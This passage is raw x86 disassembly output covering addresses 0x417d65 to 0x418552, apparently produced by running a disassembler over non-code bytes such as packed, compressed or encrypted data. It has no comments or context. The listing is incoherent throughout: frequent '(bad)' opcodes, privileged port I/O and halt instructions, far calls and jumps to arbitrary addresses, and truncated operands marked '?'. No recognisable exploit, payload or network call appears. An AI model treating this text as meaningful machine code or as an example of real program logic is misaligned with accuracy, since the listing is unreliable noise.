  417d65:	mov    dh,0xdc
  417d67:	sub    al,0x8a
  417d69:	lds    ecx,FWORD PTR [edx+0x5f]
  417d6c:	je     0x417dc8
  417d6e:	pop    edi
  417d6f:	sti    
  417d70:	test   eax,0x5742f9ce
  417d75:	cmp    eax,0x449e105e
  417d7a:	repz mov bl,0xa7
  417d7d:	or     edx,DWORD PTR [esi-0x1e]
  417d80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d81:	repz mov ds:0x9aabe1af,eax
  417d87:	dec    DWORD PTR [ecx+0x77]
  417d8a:	(bad)  
  417d8b:	jo     0x417dca
  417d8d:	ret    
  417d8e:	xchg   bx,ax
  417d90:	mov    ebx,0xd0c128dc
  417d95:	adc    edx,ebp
  417d97:	imul   ecx,DWORD PTR [ecx],0xffffffb9
  417d9a:	cmp    al,ah
  417d9c:	repnz in eax,dx
  417d9e:	xchg   ecx,eax
  417d9f:	dec    edx
  417da0:	xchg   ecx,eax
  417da1:	mov    bl,BYTE PTR ds:0x4615b073
  417da7:	sar    DWORD PTR ds:0xbd6c0f21,1
  417dad:	dec    ebx
  417dae:	hlt    
  417daf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417db0:	mov    ds,WORD PTR [ebx]
  417db2:	arpl   di,ax
  417db4:	mov    eax,0x1f6d43f0
  417db9:	or     cl,BYTE PTR [edi+0x4589ea75]
  417dbf:	int3   
  417dc0:	xlat   BYTE PTR ds:[ebx]
  417dc1:	xchg   esp,eax
  417dc2:	jns    0x417e10
  417dc4:	call   0xc135621a
  417dc9:	into   
  417dca:	jmp    0xe9856000
  417dcf:	fs jecxz 0x417e11
  417dd2:	mov    eax,0x871c0dcc
  417dd7:	jnp    0x417d80
  417dd9:	(bad)  
  417dda:	fild   QWORD PTR [esi]
  417ddc:	arpl   sp,si
  417dde:	xor    DWORD PTR [esi],ebp
  417de0:	mov    BYTE PTR [esi],cl
  417de2:	lods   al,BYTE PTR ds:[esi]
  417de3:	cmp    BYTE PTR [edi-0x43],0x6d
  417de7:	sbb    BYTE PTR [eax*1+0x65a8344f],dl
  417dee:	js     0x417e19
  417df0:	fs jbe 0x417e02
  417df3:	push   edi
  417df4:	(bad)  
  417df6:	outs   dx,BYTE PTR ds:[esi]
  417df7:	xor    DWORD PTR [ebx-0x5d98661],0xffffffb2
  417dfe:	leave  
  417dff:	neg    DWORD PTR [edx]
  417e01:	shl    DWORD PTR [ecx-0x69],1
  417e04:	xchg   edi,eax
  417e05:	pushf  
  417e06:	loope  0x417e30
  417e08:	lock dec esp
  417e0a:	mov    ebp,DWORD PTR [edx-0x47]
  417e0d:	(bad)  
  417e0e:	mov    al,0x29
  417e10:	jecxz  0x417e37
  417e12:	imul   ecx,DWORD PTR [edx-0x78],0x732620db
  417e19:	ds jns 0x417e8d
  417e1c:	pushw  ds
  417e1e:	push   ds
  417e1f:	stos   DWORD PTR es:[edi],eax
  417e20:	sbb    edi,DWORD PTR ds:0x425cf962
  417e26:	shl    BYTE PTR [edi-0x446cbfd1],cl
  417e2c:	or     eax,edi
  417e2e:	mov    ecx,0xf82bac79
  417e33:	dec    ecx
  417e34:	jo     0x417eb2
  417e36:	mov    ecx,DWORD PTR [esi-0x10332a3]
  417e3c:	cmp    bl,BYTE PTR [eax+0x5]
  417e3f:	add    eax,0x9ae5c661
  417e44:	xchg   ecx,eax
  417e45:	aad    0x3e
  417e47:	sub    al,bl
  417e49:	xlat   BYTE PTR ds:[ebx]
  417e4a:	add    ebx,DWORD PTR [ebx+0x28]
  417e4d:	inc    eax
  417e4e:	fmul   st(6),st
  417e50:	jnp    0x417ece
  417e52:	ins    BYTE PTR es:[edi],dx
  417e53:	imul   esi,esp,0x380fabee
  417e59:	mov    BYTE PTR ds:0xf6340886,dh
  417e5f:	in     eax,dx
  417e60:	pop    esi
  417e61:	(bad)  
  417e62:	cmp    edi,DWORD PTR [ebx-0x2cdc10b9]
  417e68:	fnstcw WORD PTR [esi+edi*4-0x7c032e75]
  417e6f:	adc    eax,0x11194614
  417e74:	outs   dx,DWORD PTR ds:[esi]
  417e75:	rcr    BYTE PTR [edi+0x58d9191d],1
  417e7b:	mov    ebx,0xf7085290
  417e80:	sti    
  417e81:	and    esp,ebx
  417e83:	cmp    BYTE PTR [edi+edx*4-0x6df4b5ac],bl
  417e8a:	sub    al,0x7b
  417e8c:	test   eax,0xf052327b
  417e91:	lock leave 
  417e93:	dec    esp
  417e94:	outs   dx,BYTE PTR ds:[esi]
  417e95:	ret    0xf727
  417e98:	pushf  
  417e99:	pusha  
  417e9a:	cs pop esi
  417e9c:	popf   
  417e9d:	pop    esp
  417e9e:	add    DWORD PTR [ebx],edi
  417ea0:	pop    edx
  417ea1:	sub    edi,ebx
  417ea3:	xor    ebp,edx
  417ea5:	push   ecx
  417ea6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ea7:	rol    DWORD PTR [esi-0x4d3e8ba],0x47
  417eae:	pop    ebp
  417eaf:	or     BYTE PTR [esi+ebx*2-0x1a35dc8f],cl
  417eb6:	std    
  417eb7:	jp     0x417ee0
  417eb9:	dec    esp
  417eba:	jbe    0x417e99
  417ebc:	and    eax,eax
  417ebe:	popa   
  417ebf:	mov    ecx,0x71317d1b
  417ec4:	pushf  
  417ec5:	test   BYTE PTR [ebx],ah
  417ec7:	inc    ebp
  417ec8:	dec    ecx
  417ec9:	mov    WORD PTR [edx],?
  417ecb:	cmp    eax,0xa9279915
  417ed0:	out    dx,eax
  417ed1:	dec    ebx
  417ed2:	push   0xffffffdb
  417ed4:	scas   al,BYTE PTR es:[edi]
  417ed5:	shl    BYTE PTR [ebx+0x3d6b23f1],0x7d
  417edc:	(bad)  
  417edd:	hlt    
  417ede:	dec    ebp
  417edf:	adc    BYTE PTR [ebx+0x15],0xaf
  417ee3:	jae    0x417f11
  417ee5:	sar    DWORD PTR [ebx],0xd4
  417ee8:	inc    eax
  417ee9:	sub    edx,DWORD PTR [edx-0x72f93d05]
  417eef:	je     0x417eae
  417ef1:	jbe    0x417ef8
  417ef3:	jns    0x417f5f
  417ef5:	adc    BYTE PTR [bx+di+0x59],0xf4
  417efa:	and    DWORD PTR ds:0x691655e2,edx
  417f00:	jge    0x417f75
  417f02:	adc    eax,DWORD PTR [ebp+0x65e29be6]
  417f08:	push   ds
  417f09:	lea    ebx,[edx+0x110f60b8]
  417f0f:	sub    al,0x6a
  417f11:	xor    cl,ah
  417f13:	std    
  417f14:	or     BYTE PTR [esi],al
  417f16:	inc    ecx
  417f17:	lods   eax,DWORD PTR ds:[esi]
  417f18:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  417f1a:	and    dh,ah
  417f1c:	and    DWORD PTR [edi+ebp*4+0x64],esp
  417f20:	out    0x49,eax
  417f22:	adc    ch,BYTE PTR [ecx-0x16]
  417f25:	mov    DWORD PTR [eax+0x19],ebx
  417f28:	bound  esp,QWORD PTR [edx-0x77e1e0fc]
  417f2e:	mov    cl,0x48
  417f30:	xor    al,BYTE PTR [ecx-0x75]
  417f33:	jmp    0x417f10
  417f35:	call   0xb890:0xa0790269
  417f3c:	dec    edx
  417f3d:	mov    ds:0xb0887d2f,al
  417f42:	adc    BYTE PTR [ebp-0xc70edf0],0x51
  417f49:	shl    DWORD PTR es:[ebx-0x3fc85601],1
  417f50:	cmp    esi,DWORD PTR ds:0xec440ea3
  417f56:	shl    ebx,0x79
  417f59:	jp     0x417f25
  417f5b:	and    BYTE PTR [ebx-0x6d],dl
  417f5e:	or     al,0x9a
  417f60:	pop    ds
  417f61:	retf   0xdc55
  417f64:	xor    cl,ch
  417f66:	xor    ebp,DWORD PTR [edi+0x1a]
  417f69:	pop    ecx
  417f6a:	pop    esp
  417f6b:	pop    esi
  417f6c:	xchg   edi,eax
  417f6d:	cmp    eax,0x77a0cdf1
  417f72:	rol    BYTE PTR [eax+0x42],0x29
  417f76:	and    BYTE PTR [esp+ecx*8-0x7f],cl
  417f7a:	adc    BYTE PTR ds:0x7a64c828,0xf6
  417f81:	xchg   ecx,eax
  417f82:	jg     0x417f4c
  417f84:	stc    
  417f85:	into   
  417f86:	add    DWORD PTR [ebx+eiz*8+0x7e36c002],ebp
  417f8d:	repz jge 0x417f6a
  417f90:	inc    esp
  417f91:	in     eax,dx
  417f92:	mov    bh,0xcd
  417f94:	and    bl,ah
  417f96:	ficom  DWORD PTR [ebp-0x220de0c1]
  417f9c:	xchg   ebp,eax
  417f9d:	repz cmp BYTE PTR [esi-0x381c0784],dl
  417fa4:	enter  0x8427,0x2a
  417fa8:	into   
  417fa9:	les    ebx,FWORD PTR [ecx-0x8d20eb4]
  417faf:	push   edi
  417fb0:	jns    0x417f93
  417fb2:	sbb    BYTE PTR [edi],al
  417fb4:	mov    esp,0x9ae27de3
  417fb9:	push   edi
  417fba:	loop   0x417f9f
  417fbc:	lods   al,BYTE PTR ds:[esi]
  417fbd:	ret    0xb5df
  417fc0:	sbb    al,0x46
  417fc2:	sub    BYTE PTR [eax-0xd],ah
  417fc5:	mov    esi,0xaf5b44d
  417fca:	cmp    ecx,ebp
  417fcc:	dec    edi
  417fcd:	cmp    ecx,DWORD PTR [ecx+0x5a]
  417fd0:	mov    esp,0x812de045
  417fd5:	xor    DWORD PTR [ecx],ecx
  417fd7:	and    bh,ch
  417fd9:	or     ah,BYTE PTR [esi-0x4ce39b96]
  417fdf:	sub    BYTE PTR [esi],bh
  417fe1:	cwde   
  417fe2:	sahf   
  417fe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fe4:	mov    ds:0xb3d2e880,eax
  417fe9:	xchg   edx,eax
  417fea:	outs   dx,DWORD PTR ds:[esi]
  417feb:	sub    ebx,0x7b
  417fee:	in     al,0xd9
  417ff0:	push   cs
  417ff1:	cmc    
  417ff2:	clc    
  417ff3:	retf   
  417ff4:	fild   QWORD PTR ds:0x14265698
  417ffa:	sub    BYTE PTR [ecx],ch
  417ffc:	sbb    BYTE PTR [ebp+esi*2+0x5723b6e],bh
  418003:	test   DWORD PTR [ecx],ebx
  418005:	or     bh,BYTE PTR [edx]
  418007:	icebp  
  418008:	std    
  418009:	(bad)  
  41800a:	lahf   
  41800b:	dec    edx
  41800c:	xchg   esp,eax
  41800d:	pop    esp
  41800e:	sub    al,0x85
  418010:	shl    DWORD PTR [eax-0xf79d53d],1
  418016:	cmp    eax,0x17185d57
  41801b:	scas   eax,DWORD PTR es:[edi]
  41801c:	push   ds
  41801d:	push   edi
  41801e:	jle    0x418023
  418020:	cmp    al,0x36
  418022:	sbb    eax,0xd7155c00
  418027:	push   ebp
  418028:	xor    ebp,esi
  41802a:	push   eax
  41802b:	icebp  
  41802c:	ja     0x418077
  41802e:	jmp    0xebdd59fe
  418033:	enter  0x1791,0x60
  418037:	mov    esi,0x252514a
  41803c:	pop    eax
  41803d:	inc    ecx
  41803e:	not    DWORD PTR [eax-0x67]
  418041:	jge    0x4180bf
  418043:	add    eax,0xe152a531
  418048:	or     al,0xd1
  41804a:	hlt    
  41804b:	imul   edx,DWORD PTR [ebx],0x193d4989
  418051:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418052:	fisub  WORD PTR [eax+0x6b60108d]
  418058:	mov    ah,0x5d
  41805a:	arpl   WORD PTR [edx+ebx*1-0x4331f584],si
  418061:	mov    eax,ds:0xe93bc6e7
  418066:	pop    es
  418067:	(bad)  
  418068:	mov    ds:0x444f1962,al
  41806d:	mov    esp,0xbe220004
  418072:	repnz stos BYTE PTR es:[edi],al
  418074:	loopne 0x418069
  418076:	repz ja 0x41803a
  418079:	inc    edx
  41807a:	call   0xf354bf7f
  41807f:	mov    esi,0x7a88046c
  418084:	rcr    DWORD PTR [ebp+edi*8+0x32],0x35
  418089:	fs test eax,0x8ab903c6
  41808f:	cld    
  418090:	add    cl,0x7f
  418093:	fidiv  WORD PTR [ebx-0x1ebc6ae8]
  418099:	sub    DWORD PTR [ebp+ebp*4+0x24],eax
  41809d:	lock jns 0x418091
  4180a0:	je     0x41802c
  4180a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4180a3:	xchg   DWORD PTR [ebp+0x63],ecx
  4180a6:	push   0x8c2ed097
  4180ab:	adc    al,0x3b
  4180ad:	outs   dx,DWORD PTR ds:[esi]
  4180ae:	pop    es
  4180af:	popa   
  4180b0:	xchg   esp,eax
  4180b1:	or     ebx,DWORD PTR ds:0x6fe5bbbb
  4180b7:	nop
  4180b8:	(bad)  
  4180b9:	or     eax,0x66709e66
  4180be:	xchg   esp,eax
  4180bf:	stos   BYTE PTR es:[edi],al
  4180c0:	push   ds
  4180c1:	push   edi
  4180c2:	xchg   esi,eax
  4180c3:	lahf   
  4180c4:	ret    
  4180c5:	aas    
  4180c6:	jbe    0x4180db
  4180c8:	test   eax,0x92d8cd06
  4180cd:	sar    edx,1
  4180cf:	inc    eax
  4180d0:	inc    esi
  4180d1:	push   eax
  4180d2:	inc    ecx
  4180d3:	add    esp,ebx
  4180d5:	(bad)  
  4180d6:	test   eax,0x7cae67a7
  4180db:	pop    esi
  4180dc:	in     eax,0xf4
  4180de:	retf   0xde57
  4180e1:	adc    al,0x1d
  4180e3:	fwait
  4180e4:	sub    edi,ebp
  4180e6:	hlt    
  4180e7:	std    
  4180e8:	cmc    
  4180e9:	je     0x41815a
  4180eb:	dec    esi
  4180ec:	jge    0x41810a
  4180ee:	xlat   BYTE PTR ds:[ebx]
  4180ef:	fimul  DWORD PTR [ebx-0x14d31176]
  4180f5:	xor    BYTE PTR [ebx+esi*1-0x437c1333],ah
  4180fc:	sub    eax,0x4ae1ce91
  418101:	fucomip st,st(1)
  418103:	(bad)  
  418104:	cli    
  418105:	jbe    0x4180f2
  418107:	inc    ebx
  418108:	jp     0x41817f
  41810a:	or     BYTE PTR [ecx-0x4d],dh
  41810d:	adc    al,0x9f
  41810f:	push   edi
  418110:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418111:	arpl   ax,dx
  418113:	cdq    
  418114:	loope  0x4180e7
  418116:	retf   0x824b
  418119:	xchg   ebx,eax
  41811a:	jecxz  0x418144
  41811c:	sub    bl,cl
  41811e:	cli    
  41811f:	rcl    esi,1
  418121:	inc    ebp
  418122:	add    eax,0x76af5e7e
  418127:	sbb    DWORD PTR [esi+0x1de429a9],ecx
  41812d:	arpl   WORD PTR [eax],bx
  41812f:	das    
  418130:	jne    0x418192
  418132:	aas    
  418133:	mov    bh,0xe6
  418135:	or     eax,DWORD PTR [edx-0x603be068]
  41813b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41813c:	cmp    DWORD PTR [eax+0x49],0xd6290f7c
  418143:	lods   eax,DWORD PTR ds:[esi]
  418144:	bound  edi,QWORD PTR [ebx]
  418146:	dec    ecx
  418147:	add    al,0xf6
  418149:	(bad)  [edx]
  41814b:	pop    esp
  41814c:	add    BYTE PTR [eax-0x661856f1],dh
  418152:	jne    0x41814d
  418154:	out    0xc7,al
  418156:	retf   0x5399
  418159:	dec    eax
  41815a:	add    eax,0x9df11e48
  41815f:	fst    QWORD PTR [eax+esi*4]
  418162:	das    
  418163:	inc    ebp
  418164:	(bad)  
  418165:	outs   dx,DWORD PTR ds:[esi]
  418166:	or     eax,0x86155247
  41816b:	mov    ah,0x5c
  41816d:	sub    esi,DWORD PTR [ecx-0x246d9a37]
  418173:	push   esi
  418174:	inc    ebp
  418175:	xor    eax,0xd37a4847
  41817a:	xchg   ebx,eax
  41817b:	sti    
  41817c:	enter  0x47b8,0x99
  418180:	cld    
  418181:	adc    al,0x61
  418183:	(bad)  
  418184:	dec    ah
  418186:	retf   
  418187:	je     0x41814a
  418189:	xlat   BYTE PTR ds:[ebx]
  41818a:	or     ebx,DWORD PTR [esi-0x1e671858]
  418190:	mov    al,0xf8
  418192:	neg    DWORD PTR [esi+0x6]
  418195:	clc    
  418196:	sbb    eax,0x24ad82c5
  41819b:	cwde   
  41819c:	sbb    DWORD PTR [edi-0x5b8d0542],esi
  4181a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181a3:	and    eax,0x866166ed
  4181a8:	hlt    
  4181a9:	je     0x418163
  4181ab:	inc    edi
  4181ac:	xchg   DWORD PTR [esi+0x19],edx
  4181af:	mov    ebx,0xa42cfd69
  4181b4:	jecxz  0x4181eb
  4181b6:	push   ss
  4181b7:	jle    0x418228
  4181b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4181ba:	outs   dx,BYTE PTR ds:[esi]
  4181bb:	add    BYTE PTR ds:[esi+0x2376e563],ch
  4181c2:	jns    0x41823a
  4181c4:	out    dx,eax
  4181c5:	jge    0x4181f3
  4181c7:	sbb    dl,bl
  4181c9:	mov    DWORD PTR [esi],esp
  4181cb:	loope  0x418199
  4181cd:	mov    DWORD PTR [ebx-0x2069cee4],esi
  4181d3:	ret    0x4aad
  4181d6:	mov    ds:0x9fb0b4e7,eax
  4181db:	jle    0x4181d4
  4181dd:	inc    ecx
  4181de:	bound  ebp,QWORD PTR [edi+0x1a]
  4181e1:	leave  
  4181e2:	push   edi
  4181e3:	push   ebx
  4181e4:	js     0x4181e8
  4181e6:	gs dec esi
  4181e8:	pop    ebp
  4181e9:	test   eax,0x4b824852
  4181ee:	push   edi
  4181ef:	retf   0x3b46
  4181f2:	jno    0x41819b
  4181f4:	xor    bl,BYTE PTR [esp+edx*1]
  4181f7:	outs   dx,DWORD PTR ds:[esi]
  4181f8:	sahf   
  4181f9:	adc    eax,0x9a948cf0
  4181fe:	mov    ah,dh
  418200:	xchg   DWORD PTR [esi+0x49],ebp
  418203:	add    al,0xfb
  418205:	in     al,dx
  418206:	mov    al,ds:0x483fa4b2
  41820b:	int    0xbd
  41820d:	mov    bh,0xc3
  41820f:	lods   al,BYTE PTR ds:[esi]
  418210:	or     BYTE PTR [edi-0x26],0x4b
  418214:	sbb    al,0x4c
  418216:	dec    edx
  418217:	je     0x4181a7
  418219:	pop    ecx
  41821a:	mov    WORD PTR [edi+0x76],?
  41821d:	fisttp WORD PTR [eax-0x1a5e9fec]
  418223:	dec    ebp
  418224:	pop    ds
  418225:	ins    BYTE PTR es:[edi],dx
  418226:	inc    ebx
  418227:	arpl   WORD PTR [edx-0x53e57403],bx
  41822d:	xchg   edx,eax
  41822e:	call   0xf2ce:0x5f0af967
  418235:	xchg   ebx,eax
  418236:	mov    dh,0x8c
  418238:	mov    eax,0x1ff66e4d
  41823d:	cdq    
  41823e:	xor    DWORD PTR [edx-0x45e0eb0],ebp
  418244:	lds    ebx,FWORD PTR [esi+0x43]
  418247:	outs   dx,BYTE PTR ds:[esi]
  418248:	in     al,0xf1
  41824a:	jle    0x41822a
  41824c:	sub    edi,DWORD PTR [edx]
  41824e:	pop    ebx
  41824f:	jl     0x4182ca
  418251:	cmp    dl,BYTE PTR [ecx+0x4f715a8a]
  418257:	mov    ebp,0x18bfe60b
  41825c:	lock pop ss
  41825e:	mov    al,ds:0x9a633bc2
  418263:	pop    edx
  418264:	pop    edx
  418265:	xchg   esp,eax
  418266:	push   ebp
  418267:	xchg   edx,eax
  418268:	xor    eax,0x786ba3d
  41826d:	jl     0x418216
  41826f:	fstp   TBYTE PTR [eax+0x3aa85bf8]
  418275:	popa   
  418276:	(bad)  
  418277:	loopne 0x418251
  418279:	add    eax,0xae5782cb
  41827e:	mov    esp,0x7a6ae960
  418283:	pushf  
  418284:	aam    0xc
  418286:	ins    DWORD PTR es:[edi],dx
  418287:	dec    eax
  418288:	pop    esp
  418289:	xchg   esi,eax
  41828a:	pop    ebx
  41828b:	test   eax,0x7bf86e46
  418290:	sbb    DWORD PTR [edx-0x11],0x7
  418294:	out    dx,eax
  418295:	jmp    0xdf56b4ad
  41829a:	jp     0x418245
  41829c:	(bad)  
  41829d:	aas    
  41829e:	popf   
  41829f:	jnp    0x418312
  4182a1:	std    
  4182a2:	or     BYTE PTR [eax],dl
  4182a4:	mov    dl,0xf9
  4182a6:	pop    ebx
  4182a7:	inc    ebx
  4182a8:	mov    fs,WORD PTR [ebx+0x1f]
  4182ab:	jg     0x4182ac
  4182ad:	mov    ebp,0x61c26893
  4182b2:	js     0x41827d
  4182b4:	push   ss
  4182b5:	scas   al,BYTE PTR es:[edi]
  4182b6:	fnstcw WORD PTR gs:[ebx+0x1a16691b]
  4182bd:	dec    ecx
  4182be:	xbegin 0xfd86de51
  4182c4:	daa    
  4182c5:	dec    ecx
  4182c6:	push   edx
  4182c7:	gs (bad) 
  4182c9:	ficomp WORD PTR [edi-0x22]
  4182cc:	loope  0x41828d
  4182ce:	sbb    DWORD PTR [edi-0x25],ecx
  4182d1:	sar    DWORD PTR [edi+0x36],1
  4182d4:	popa   
  4182d5:	std    
  4182d6:	xchg   ebp,eax
  4182d7:	pop    es
  4182d8:	mov    ch,0xed
  4182da:	xchg   edx,eax
  4182db:	push   ss
  4182dc:	ds mov ebx,0x260b0e3d
  4182e3:	and    cl,bh
  4182e5:	shl    esi,0x45
  4182e8:	sub    al,0x2e
  4182ea:	pop    eax
  4182eb:	mov    bl,0xba
  4182ed:	inc    esp
  4182ee:	xchg   edi,eax
  4182ef:	fidiv  WORD PTR [ecx]
  4182f1:	es ss jns 0x418282
  4182f5:	mov    esp,0xda70edb7
  4182fa:	mov    DWORD PTR [edx+ecx*2],ebx
  4182fd:	les    edi,FWORD PTR [ecx+edi*1+0x2a10197]
  418304:	sub    DWORD PTR [edx+0x1ad19149],edx
  41830a:	out    dx,al
  41830b:	(bad)  
  41830c:	mov    ecx,0xa28fc054
  418311:	(bad)  
  418312:	cwde   
  418313:	push   ebx
  418314:	jg     0x418355
  418316:	mov    edx,0xdfa1173
  41831b:	mov    bl,ch
  41831d:	inc    ebp
  41831e:	stos   BYTE PTR es:[edi],al
  41831f:	sbb    al,0x4b
  418321:	jl     0x418304
  418323:	add    ecx,DWORD PTR [edx-0x44]
  418326:	in     eax,0x96
  418328:	push   edi
  418329:	test   BYTE PTR [ecx+0x33],0xb1
  41832d:	mov    al,0x8c
  41832f:	xchg   ebp,eax
  418330:	mov    ds:0x19be9da9,al
  418335:	rcr    esp,1
  418337:	cld    
  418338:	imul   ebp,edx,0xffffff88
  41833b:	arpl   WORD PTR [esi],ax
  41833d:	mov    bh,0xf
  41833f:	imul   eax,DWORD PTR [eax-0x80],0xb1068d21
  418346:	stos   DWORD PTR es:[edi],eax
  418347:	jge    0x41839a
  418349:	test   eax,0x3a11c994
  41834e:	scas   al,BYTE PTR es:[edi]
  41834f:	inc    ebx
  418350:	mov    bh,0xc9
  418352:	jnp    0x418314
  418354:	sub    al,0xf6
  418356:	loopne 0x4183c0
  418358:	pop    ss
  418359:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41835a:	mov    dl,0x61
  41835c:	jecxz  0x418319
  41835e:	and    eax,0x3620e1b3
  418363:	pushf  
  418364:	scas   al,BYTE PTR es:[edi]
  418365:	cs and al,0xee
  418368:	addr16 or ebp,ebx
  41836b:	and    DWORD PTR [ecx+0x44],ebp
  41836e:	inc    eax
  41836f:	push   es
  418370:	mov    ebp,0x2d5d970
  418375:	imul   esi,DWORD PTR [eax+eiz*1],0x3a417273
  41837c:	repnz in al,dx
  41837e:	sbb    BYTE PTR [eax-0xa104421],bh
  418384:	push   ss
  418385:	enter  0x941d,0x96
  418389:	loope  0x41836d
  41838b:	sub    al,0xab
  41838d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41838e:	jb     0x418400
  418390:	inc    edi
  418391:	or     eax,0x5d40fba2
  418396:	(bad)  
  418397:	or     ah,ah
  418399:	das    
  41839a:	shl    DWORD PTR [ebx-0x69],cl
  41839d:	cmp    al,0x81
  41839f:	dec    edx
  4183a0:	and    bh,ah
  4183a2:	push   0xfffffff0
  4183a4:	and    eax,0x8f269f2b
  4183a9:	sar    BYTE PTR [esi],0x7e
  4183ac:	lahf   
  4183ad:	mov    ch,0x36
  4183af:	dec    ebx
  4183b0:	rcl    bl,0xba
  4183b3:	mov    eax,0x19e93f8d
  4183b8:	test   al,0x39
  4183ba:	fadd   DWORD PTR [eax]
  4183bc:	mov    edx,0xbeccc8e0
  4183c1:	js     0x4183dc
  4183c3:	pop    eax
  4183c4:	adc    ebx,DWORD PTR [ecx+0x26d3d4ca]
  4183ca:	sbb    al,0xe0
  4183cc:	test   esp,edi
  4183ce:	(bad)  [edi+esi*2]
  4183d1:	ss jl  0x418403
  4183d4:	cmp    BYTE PTR [edx+0x7316eb20],bl
  4183da:	sub    al,0x27
  4183dc:	test   al,0xe9
  4183de:	sub    al,0x78
  4183e0:	pop    edi
  4183e1:	xor    al,0x25
  4183e3:	clc    
  4183e4:	xchg   BYTE PTR [esi],ch
  4183e6:	jge    0x418447
  4183e8:	or     esi,DWORD PTR [esi-0x77]
  4183eb:	mov    dh,0x3
  4183ed:	pop    ebp
  4183ee:	cwde   
  4183ef:	mov    bl,0xee
  4183f1:	test   DWORD PTR [ebp+0xe],esi
  4183f4:	rol    DWORD PTR [eax-0x4ea215e],1
  4183fa:	xor    ch,0x1d
  4183fd:	xchg   esi,eax
  4183fe:	mov    ah,0x1a
  418400:	push   ds
  418401:	adc    eax,0x5c5db95b
  418406:	es scas eax,DWORD PTR es:[edi]
  418408:	add    ah,BYTE PTR [edi+0xa]
  41840b:	jb     0x41843f
  41840d:	jmp    0x48d2:0xcf737126
  418414:	jnp    0x418419
  418416:	xchg   edi,eax
  418417:	fldcw  WORD PTR [esp+edx*4-0x3e]
  41841b:	cmc    
  41841c:	mov    ebx,0x2d98dff9
  418421:	retf   
  418422:	mov    WORD PTR [ebx+0x5f2cecfa],?
  418428:	scas   al,BYTE PTR es:[edi]
  418429:	out    0x3b,eax
  41842b:	dec    esi
  41842c:	xor    BYTE PTR [esi-0x4aa2c91d],cl
  418432:	imul   ecx,DWORD PTR [ebx-0x26],0x8da40a49
  418439:	bound  ecx,QWORD PTR [edx-0x40897ebc]
  41843f:	out    0xfd,al
  418441:	aam    0xd0
  418443:	stos   BYTE PTR es:[edi],al
  418444:	jp     0x4183f8
  418446:	mov    esi,0x7711661
  41844b:	xchg   ebp,eax
  41844c:	lock data16 jg 0x4184c8
  418450:	in     al,dx
  418451:	(bad)
  418454:	sub    DWORD PTR [ecx-0x35],edi
  418457:	(bad)  
  418458:	push   edi
  418459:	addr16 dec eax
  41845b:	and    BYTE PTR [ecx],ch
  41845d:	aas    
  41845e:	cmp    al,0xd8
  418460:	les    eax,FWORD PTR [esp+eax*8+0x28f4ffc1]
  418467:	fs daa 
  418469:	jl     0x4184a1
  41846b:	bound  ebx,QWORD PTR [ebx+0x50]
  41846e:	add    ebp,0x6c
  418471:	mov    esi,0x510cab20
  418476:	pop    ebp
  418477:	sti    
  418478:	xchg   edi,eax
  418479:	inc    eax
  41847a:	and    eax,0xec7ba52c
  41847f:	fild   WORD PTR ds:0x5639f21e
  418485:	loope  0x41840b
  418487:	repz cld 
  418489:	mov    dl,0xd7
  41848b:	aas    
  41848c:	jns    0x4184e4
  41848e:	mov    dh,0x66
  418490:	inc    esp
  418491:	xchg   BYTE PTR [ecx-0x3],al
  418494:	mov    BYTE PTR [ebx],al
  418496:	adc    eax,0x11b304f9
  41849b:	leave  
  41849c:	fiadd  WORD PTR [ebx+0x4c990964]
  4184a2:	sbb    DWORD PTR [edi-0x41719ea7],0x3ea2f5ac
  4184ac:	mov    dh,0x29
  4184ae:	lds    esp,FWORD PTR [esi+edx*1-0x4f]
  4184b2:	or     eax,0x2652f534
  4184b7:	call   0x971:0x4c782347
  4184be:	jbe    0x418487
  4184c0:	pop    esi
  4184c1:	adc    eax,0xc30230f7
  4184c6:	mov    bh,0xeb
  4184c8:	dec    edx
  4184c9:	adc    DWORD PTR [ebx+0x6c],ebx
  4184cc:	cdq    
  4184cd:	adc    BYTE PTR [eax-0x4d],dl
  4184d0:	mov    DWORD PTR [ecx],edx
  4184d2:	xchg   edx,eax
  4184d3:	add    al,0xe8
  4184d5:	xor    DWORD PTR [esi+0x22ce9fd6],esi
  4184db:	mov    eax,DWORD PTR [eax]
  4184dd:	mov    ebx,0x475ea46e
  4184e2:	addr16 mov al,0x78
  4184e5:	mov    ebp,0x54b1f18a
  4184ea:	xchg   BYTE PTR [ebx+0x6cade595],ah
  4184f0:	stc    
  4184f1:	out    dx,eax
  4184f2:	leave  
  4184f3:	jns    0x418570
  4184f5:	mov    ecx,0x51619f54
  4184fa:	lock sbb eax,0x3a49ce3e
  418500:	mov    bh,0x2c
  418502:	jle    0x41851b
  418504:	in     eax,dx
  418505:	xor    al,0x35
  418507:	ja     0x418496
  418509:	fs pop si
  41850c:	sub    BYTE PTR [esi],bl
  41850e:	aam    0xb7
  418510:	leave  
  418511:	retf   
  418512:	stc    
  418513:	pop    edx
  418514:	or     eax,0xccb26339
  418519:	add    ah,BYTE PTR [ebx-0x4fb52e8]
  41851f:	data16 cmp BYTE PTR [eax+0x2cdd1f49],ch
  418526:	fcmovu st,st(6)
  418528:	pop    esp
  418529:	aad    0x66
  41852b:	sub    esp,DWORD PTR [eax]
  41852d:	ret    0x8713
  418530:	mov    ebx,0x541ce3bf
  418535:	pop    esp
  418536:	sbb    DWORD PTR [edx],0xffffffeb
  418539:	mov    edi,0xb9916a6c
  41853e:	out    dx,al
  41853f:	loope  0x41853e
  418541:	mov    dh,0x91
  418543:	repnz outs dx,DWORD PTR ds:[esi]
  418545:	nop
  418546:	repnz mov esp,0xcf133b54
  41854c:	xchg   esp,eax
  41854d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41854e:	inc    esp
  41854f:	pusha  
  418550:	loop   0x418529
  418552:	scas   eax,DWORD PTR es:[edi]
